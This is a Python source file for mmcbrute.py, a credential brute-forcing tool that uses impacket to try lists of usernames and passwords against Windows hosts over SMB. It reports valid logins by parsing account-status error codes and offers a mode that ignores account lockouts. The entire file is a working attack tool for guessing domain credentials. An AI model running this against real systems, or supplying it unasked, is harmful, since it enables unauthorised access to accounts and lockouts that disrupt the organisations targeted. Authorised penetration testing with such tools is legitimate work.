#!/usr/bin/env python3
#
#  mmcbrute.py
#
#  Copyright 2017 Corey Gilks <CoreyGilks [at] gmail [dot] com>
#  Twitter: @CoreyGilks
#
#  2to3 and upgrades contributed by phx (https://github.com/phx)
#  Twitter: @rubynorails
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

import argparse
import datetime
import sys
import os
import logging

try:
	from impacket.smbconnection import SMBConnection
except ImportError:
	print('You must install impacket before continuing')
	sys.exit(os.EX_SOFTWARE)

def is_readable_file(path):
	return os.path.isfile(path) and os.access(path, os.R_OK)

class LoggingAdapter(logging.LoggerAdapter):
	def process(self, msg, kwargs):
		timestamp_true = kwargs.pop('time', self.extra['time'])
		if timestamp_true:
			return f"{datetime.datetime.now().astimezone().strftime('[%Y-%m-%d %I:%M:%S %p %z]')} {msg}", kwargs
		return f"{msg}", kwargs

class MMCBrute(object):
	def __init__(self, usernames, passwords, domain, target, user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):
		self.usernames = open(usernames, 'r')
		self.len_usernames = sum((1 for _ in self.usernames))
		self.usernames.seek(os.SEEK_SET)
		self.domain = domain
		self.target = target
		self.targets = target
		self.honeybadger = honeybadger
		self.verbose = verbose
		self.user_as_pass = user_as_pass
		self.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))
		self.log = logging.getLogger(__name__)
		self.log = LoggingAdapter(self.log, {"time": None})
		self.count = 0
		self.len_passwords = 0
		self.len_targets = 1

		if passwords is not None:
			self.passwords = open(passwords, 'r')
			self.len_passwords = sum((1 for _ in self.passwords))
			self.passwords.seek(os.SEEK_SET)

		if self.user_as_pass and passwords is not None:
			self.len_passwords += 1
		elif self.user_as_pass:
			self.passwords = False
			self.len_passwords += 1

		if is_readable_file(self.target):
			self.targets = open(self.target, 'r')
			self.len_targets = sum((1 for _ in self.targets))
			self.targets.seek(os.SEEK_SET)

		self.totals = self.len_targets * self.len_usernames * self.len_passwords

	@classmethod
	def from_args(cls, args):
		return cls(args.usernames, args.passwords, args.domain, args.target, args.uap, args.hb, args.verbose, args.loglvl)

	def update_progress(self):
		self.count += 1
		sys.stdout.write(f"Progress: {self.count}/{self.totals} ({(100 * self.count / self.totals)}%)  \r")
		sys.stdout.flush()

	def run(self):
		self.targets.seek(os.SEEK_SET)
		for target in self.targets:
			target = target.strip()
			self.target = target
			smb_connection = SMBConnection(self.target, self.target)
			for user in enumerate(self.usernames):
				user = user[-1].strip()
				if self.user_as_pass:
					self.update_progress()
					next_user = self.login(self.target, self.domain, user, user, smb_connection)
					if next_user:
						# Restablish smb_connection to avoid false positves
						smb_connection.close()
						smb_connection = SMBConnection(self.target, self.target)
						continue
				if self.passwords:
					self.passwords.seek(os.SEEK_SET)
					for password in enumerate(self.passwords):
						password = password[-1].strip()
						self.update_progress()
						next_user = self.login(self.target, self.domain, user, password, smb_connection)
						if next_user:
							# Restablish smb_connection to avoid false positves
							smb_connection.close()
							smb_connection = SMBConnection(self.target, self.target)
							break
			self.usernames.seek(os.SEEK_SET)
			self.passwords.seek(os.SEEK_SET)

	def login(self, target, domain, username, password, smb_connection):
		attempt = f"{domain}/{username}:{password}"
		try:
			# This line will always raise an exception unless the credentials can initiate an smb connection
			smb_connection.login(username, password, domain)
			self.log.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m", time=True)
			return True

		except Exception as msg:
			msg = str(msg)
			if 'STATUS_NO_LOGON_SERVERS' in msg:
				self.log.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m", time=True)
				sys.exit(os.EX_SOFTWARE)

			elif 'STATUS_LOGON_FAILURE' in msg:
				if self.verbose:
					self.log.info(f"\033[91m[-] Failed on {target}: {attempt}\033[0m", time=True)
				return False

			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
				self.log.error(f"\033[93m[-] Account Locked Out on {target}: {attempt}\033[0m", time=True)
				if not self.honeybadger:
					self.log.info(
						'\033[94m[!] Honey Badger mode not enabled. Halting to prevent further lockouts..\033[0m')
					answer = str(raw_input('\033[94m[!] Would you like to proceed with the bruteforce? (Y/N) '))
					if answer.lower() in ["y", "yes", ""]:
							self.log.info('\033[93m[*] Resuming...', time=True)
							return False
					else:
							self.log.info('\033[91m[-]Exiting...', time=True)
							sys.exit(os.EX_SOFTWARE)

			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
				self.log.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m", time=True)

			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
				self.log.info(f"\033[92m[+] Success (Account Active) {attempt}\033[0m", time=True)

			elif 'STATUS_PASSWORD_EXPIRED' in msg:
				self.log.info(f"\033[92m[+] Success (Password Expired) {attempt}\033[0m", time=True)

			elif 'STATUS_ACCOUNT_DISABLED' in msg:
				self.log.info(f"\033[91m[-] Valid Password (Account Disabled) {attempt}\033[0m", time=True)

			else:
				self.log.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m", time=True)
			return True

	def end(self):
		self.log.info(f"\033[94m\n")
		self.log.info(f"Ended at:\t\t{datetime.datetime.now().astimezone().strftime('%I:%M %p %z on %B %d, %Y')}\033[0m\n")

	def info(self):
		self.log.info(f"\033[94mTarget:\t\t\t{self.target}")
		self.log.info(f"Target count:\t\t{self.len_targets}")
		self.log.info(f"Username count:\t\t{self.len_usernames}")
		self.log.info(f"Password count:\t\t{self.len_passwords}")
		self.log.info(f"Estimated attempts:\t{self.len_passwords}")
		self.log.info(f"User-as-Pass Mode:\t{self.user_as_pass}")
		self.log.info(f"Honey Badger Mode:\t{self.honeybadger}")
		self.log.info(f"Verbose:\t\t{self.verbose}")
		self.log.info(f"Time:\t\t\t{datetime.datetime.now().astimezone().strftime('%I:%M %p %z on %B %d, %Y')}\033[0m\n")

if __name__ == '__main__':
	script_path = os.path.dirname(os.path.abspath(__file__))
	os.chdir(script_path)

	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
	parser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')
	group = parser.add_argument_group('Bruteforce options')
	group.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address')
	group.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')
	group.add_argument('-p', '--passwords', action='store', dest='passwords', help='Text file of passwords')
	group.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')
	group.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Text file of usernames')
	group.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')
	group.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')
	options = parser.parse_args()

	if options.passwords is None and options.uap is False:
		parser.error('The --passwords or --user-as-pass option is required')

	if not is_readable_file(options.usernames):
		parser.error('The --usernames option must be a readable file')

	if options.passwords is not None and not is_readable_file(options.passwords):
		parser.error('The --passwords option must be a readable file')

	brute = MMCBrute.from_args(options)
	try:
		brute.info()
		brute.run()
	except KeyboardInterrupt:
		print('\033[94m\n[*] Caught ctrl-c, exiting')
	finally:
		brute.end()
